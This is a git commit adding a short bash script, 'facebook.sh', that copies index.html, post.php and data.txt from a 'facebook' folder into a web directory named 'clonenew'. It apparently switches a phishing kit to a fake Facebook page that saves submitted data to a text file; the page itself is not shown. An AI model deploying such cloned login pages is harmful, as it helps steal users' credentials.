57309f98da29ee848b6dda96fb92e922e74ff921
mak <makindosx@gmail.com>
2017-05-27 01:53:52 +0300

    Create facebook.sh

---
+++ shell/facebook.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+
+cp -avr /var/www/clonenew/facebook/index.html /var/www/clonenew/
+cp -avr /var/www/clonenew/facebook/post.php /var/www/clonenew/
+cp -avr /var/www/clonenew/facebook/data.txt /var/www/clonenew/
